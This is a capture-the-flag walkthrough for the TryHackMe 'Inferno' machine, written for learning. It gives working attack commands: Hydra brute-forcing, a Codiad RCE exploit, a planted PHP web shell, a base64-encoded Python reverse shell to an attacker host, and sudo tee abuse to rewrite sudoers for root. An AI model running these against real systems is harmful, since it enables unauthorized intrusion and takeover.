# Inferno

Real Life machine + CTF. The machine is designed to be real-life (maybe not?) and is perfect for newbies starting out in penetration testing 

"Midway upon the journey of our life I found myself within a forest dark, For the straightforward pathway had been lost. Ah me! how hard a thing it is to say What was this forest savage, rough, and stern, Which in the very thought renews the fear."

There are 2 hash keys located on the machine (user - local.txt and root - proof.txt), can you find them and become root?

Remember: in the nine circles of Hell you will find some demons that will try to prevent your access, ignore them and move on. (if you can)

Room: https://tryhackme.com/room/inferno

Not the hacking group

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/inferno.md

# Inferno — Walkthrough

> Flags, passwords, hashes, and machine-specific IP addresses have been redacted.

## Overview

The attack path was:

1. Enumerate the web service.
2. Authenticate to the protected Codiad installation.
3. Exploit authenticated Codiad remote code execution.
4. Establish a more reliable PHP command shell.
5. Identify a root cron job that kills Bash shells and creates fake Netcat listeners.
6. Enumerate Dante's home directory.
7. Decode a hidden hexadecimal file containing Dante's credentials.
8. Log in as Dante and collect the user flag.
9. Abuse passwordless `sudo tee` to write a new sudoers rule.
10. Obtain root and collect the proof flag.

---

## 1. Finding the Protected Web Application

Initial web enumeration identified the `/inferno/` directory:

```bash
gobuster dir   -u http://MACHINE_IP/   -w /usr/share/wordlists/dirb/common.txt   -t 50
```

The important result was:

```text
/inferno/    (Status: 401)
```

Requesting the directory confirmed that it used HTTP Basic Authentication:

```bash
curl -I http://MACHINE_IP/inferno/
```

The response included:

```text
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic
```

## 3. Brute-Forcing HTTP Basic Authentication

The common username `admin` was tested against the protected directory with Hydra:

```bash
hydra   -l admin   -P /usr/share/wordlists/rockyou.txt   MACHINE_IP   http-get /inferno/
```

Hydra recovered the working credentials:

```text
Username: admin
Password: <HTTP_PASSWORD>
```

Verify them with `curl`:

```bash
curl -I -u 'admin:<HTTP_PASSWORD>'   http://MACHINE_IP/inferno/
```

A successful authenticated response confirmed the credentials. Behind the authentication prompt was a Codiad installation.

---

## 3. Exploiting Codiad

Searchsploit identified an authenticated remote-code-execution exploit for Codiad:

```bash
searchsploit codiad
searchsploit -m 49705
```

The exploit required a small adjustment so it could authenticate through HTTP Basic Authentication:

```python
username = sys.argv[2]
password = sys.argv[3]
session.auth = (username, password)
```

Run the exploit:

```bash
python3 49705.py \
  'http://MACHINE_IP/inferno/' \
  admin '<HTTP_PASSWORD>' \
  ATTACKBOX_IP 4444 linux
```

This produced a shell as:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The initial Bash shell was unstable and repeatedly terminated.

---

## 4. Creating a Persistent Web Command Shell

A writable directory existed inside the Codiad installation. A simple PHP command shell was created at:

```text
/var/www/html/inferno/themes/default/filemanager/images/codiad/manifest/files/codiad/example/INF/shell.php
```

Contents:

```php
<?php
if (isset($_REQUEST["cmd"])) {
    system($_REQUEST["cmd"]);
}
?>
```

The command shell could be tested with:

```bash
URL='http://MACHINE_IP/inferno/themes/default/filemanager/images/codiad/manifest/files/codiad/example/INF/shell.php'

curl -s -u 'admin:<HTTP_PASSWORD>' \
  --get \
  --data-urlencode 'cmd=id' \
  "$URL"
```

Expected result:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 5. Investigating the Unstable Shell

`pspy` showed a root cron job repeatedly executing:

```text
/bin/sh -c sh /var/www/html/machine_services1320.sh
```

The script contained:

```sh
pkill bash &
nc -nvlp 21 &
nc -nvlp 23 &
nc -nvlp 25 &
...
nc -nvlp 60179 &
```

The first command explains why Bash reverse shells kept dying:

```sh
pkill bash
```

The many Netcat commands created fake listening ports to make network enumeration noisy:

```sh
nc -nvlp 2000 &
```

This means:

- `nc` — run Netcat
- `-n` — disable DNS resolution
- `-v` — verbose mode
- `-l` — listen mode
- `-p 2000` — listen on port 2000
- `&` — run in the background

These listeners did not provide shells because no command was attached to them.

---

## 6. Establishing a Stable Non-Bash Shell

Start a listener:

```bash
rlwrap nc -lvnp 4445
```

Generate a Python reverse shell that launches `/bin/sh` rather than Bash:

```bash
URL='http://MACHINE_IP/inferno/themes/default/filemanager/images/codiad/manifest/files/codiad/example/INF/shell.php'

PAYLOAD='python3 -c '"'"'import os,socket,subprocess;s=socket.socket();s.connect(("ATTACKBOX_IP",4445));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'"'"''

ENC=$(printf '%s' "$PAYLOAD" | base64 -w0)

curl -s -u 'admin:<HTTP_PASSWORD>' \
  --get \
  --data-urlencode "cmd=echo '$ENC' | base64 -d | sh >/dev/null 2>&1 &" \
  "$URL"
```

The resulting `/bin/sh` session survived the recurring `pkill bash` command.

---

## 7. Enumerating the Codiad User Database

Codiad stored its users in:

```text
/var/www/html/inferno/data/users.php
```

The file contained an administrator account and an SHA-1 password hash:

```text
admin:<REDACTED_SHA1_HASH>
```

The recovered value matched the HTTP/Codiad password:

```text
<HTTP_PASSWORD>
```

The password was not reused for Dante's Linux account.

---

## 8. Enumerating Dante's Home Directory

Search Dante's home directory:

```sh
find /home/dante -maxdepth 3 -ls 2>/dev/null
```

The output revealed several readable documents and a hidden file:

```text
/home/dante/Downloads/.download.dat
```

Because the name begins with a dot, a normal `ls` command would not display it. Use:

```sh
ls -la /home/dante/Downloads
```

The file contained hexadecimal byte values:

```sh
cat /home/dante/Downloads/.download.dat
```

Decode it with:

```sh
xxd -r -p /home/dante/Downloads/.download.dat
```

Most of the decoded text was Italian poetry, but the final line contained credentials:

```text
dante:<DANTE_PASSWORD>
```

---

## 9. Logging in as Dante

From the AttackBox:

```bash
ssh dante@MACHINE_IP
```

Enter:

```text
<DANTE_PASSWORD>
```

Because root's cron job kills Bash processes, a more stable option is:

```bash
ssh -t dante@MACHINE_IP /bin/sh
```

Confirm access:

```sh
id
pwd
```

Read the user flag:

```sh
cat /home/dante/local.txt
```

Result:

```text
<USER_FLAG>
```

---

## 10. Enumerating Sudo Permissions

Check Dante's sudo permissions:

```sh
sudo -l
```

The important entry was:

```text
(root) NOPASSWD: /usr/bin/tee
```

`tee` can write data to files as root. This allows Dante to create a new sudoers configuration.

---

## 11. Abusing `sudo tee`

Create a sudoers rule granting Dante unrestricted passwordless sudo:

```sh
printf 'dante ALL=(ALL:ALL) NOPASSWD: ALL\n' |
sudo /usr/bin/tee /etc/sudoers.d/dante >/dev/null
```

Confirm the new permission:

```sh
sudo -l
```

The output should now include:

```text
(ALL : ALL) NOPASSWD: ALL
```

Launch a root `/bin/sh` shell:

```sh
sudo /bin/sh
```

Verify:

```sh
id
```

Expected result:

```text
uid=0(root) gid=0(root) groups=0(root)
```

---

## 12. Reading the Root Flag

Move into root's home directory:

```sh
cd /root
ls -la
```

Read the proof flag:

```sh
cat /root/proof.txt
```

Result:

```text
<ROOT_FLAG>
```

---

## Attack Chain Summary

```text
HTTP Basic Auth
      ↓
Codiad authenticated RCE
      ↓
www-data shell
      ↓
PHP command shell
      ↓
pspy identifies root cron job
      ↓
Avoid Bash because of recurring pkill
      ↓
Read /home/dante/Downloads/.download.dat
      ↓
Hex decode reveals Dante's password
      ↓
SSH as Dante
      ↓
sudo tee
      ↓
Write /etc/sudoers.d/dante
      ↓
Root shell
```

---

## Key Lessons

- Hidden dotfiles can contain important clues even when surrounded by obvious decoy files.
- Word-processing documents were largely distractions; `.download.dat` was the useful lead.
- Unstable shells may be caused by defensive scripts rather than networking problems.
- `sudo tee` is dangerous because it permits writing arbitrary root-owned files.
- Large numbers of open ports do not necessarily represent real services.
- When Bash is deliberately killed, use another shell such as `/bin/sh`.
